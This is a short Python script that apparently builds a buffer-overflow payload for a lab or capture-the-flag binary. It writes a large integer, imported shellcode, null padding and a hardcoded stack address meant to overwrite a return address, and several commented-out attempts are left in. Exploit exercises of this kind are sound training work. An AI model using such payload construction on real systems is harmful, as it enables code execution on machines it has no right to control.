#!/usr/bin/env python3

import sys

from shellcode import shellcode

#sys.stdout.buffer.write(0x8fffffffffffffff.to_bytes(8, 'little'))

#sys.stdout.buffer.write(shellcode)
'''
sys.stdout.buffer.write('S'*18)

sys.stdout.buffer.write(0x7ffffff6cda0.to_bytes(8, 'little'))
'''
sys.stdout.buffer.write(0x8000000000000001.to_bytes(8, 'little') + shellcode + b'\x00'*18 + 0x7ffffff68f90.to_bytes(8, 'little'))